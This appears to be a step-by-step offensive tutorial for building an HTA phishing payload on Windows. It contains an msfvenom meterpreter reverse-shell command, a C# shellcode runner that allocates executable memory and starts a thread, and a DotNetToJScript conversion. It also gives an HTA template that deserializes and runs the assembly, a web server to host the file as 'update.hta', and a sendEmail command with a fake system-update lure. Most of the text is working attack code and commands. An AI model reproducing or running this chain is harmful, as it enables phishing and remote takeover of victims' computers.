# HTA Payload - C# Shellcode Runner and DotNetToJScript

1. Download an up to date version of DotNetToJScript.

2. Configure DotNetToJScript.

Open the solution file inside Visual Studio, and accept to adapt .NET if prompted.

Then inside the property of DotNetToJscript, verify that the .NET version is set to 3.5.

Inside the property of ExampleAssembly, verify that the .NET version is set to 4.5.

3. Modify the TestClass.cs file with your C# Shellcode Runner.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.112 LPORT=80 -f csharp
```

```C#
﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

[ComVisible(true)]
public class TestClass
{
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("kernel32.dll")]
	static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	public TestClass()
	{
		byte[] buf = new byte[784] {
			<SHELLCODE_OF_784_BYTES>};

		int size = buf.Length;

		IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

		Marshal.Copy(buf, 0, addr, size);

		IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

		WaitForSingleObject(hThread, 0xFFFFFFFF);

	}
	public void RunProcess(string path)
    {
		Process.Start(path);
    }
}


```

4. Build both codes to it's release.

5. Copy DotNetToJScript executable release and the "NDesk.Options.dll" to the same location, and add the dll release of ExampleAssembly to it. 

6. Once the three files are inside the same directory, open a terminal at the same location, and run DotNetToJScript to transform the DLL to a jscript file.

```
C:\Dev-Hta> DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o payload.js
```

7. Create a HTA file with a base structure of HTML code and copy paste the content of payload.js into it.

```hta
<html>
<head>
<script language="JScript">
function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
...
"AAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZsZWN0"+
"aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

8. Save it as "update.hta". Copy it into your kali and start a SimpleHTTPServer on port 443.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~/Documents/stuff/try]
└─$ python -m SimpleHTTPServer 443                                                                              1 ⨯
Serving HTTP on 0.0.0.0 port 443 ...
```

9. Start a listener that match with your generated payload and serve the HTA file through mail.


```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ sendEmail -t target@sinhack.com -f target@sinhack.com -s 192.168.x.x -u "Issue - Update your system" -m 'Run the following update to fix the issue http://192.168.x.x:443/update.hta'
May 24 19:41:05 k4l1-l1nux sendEmail[8752]: Email was sent successfully!

```

If the user open our malicious attachment (HTA payload), we should retrieve a shell in our listener.
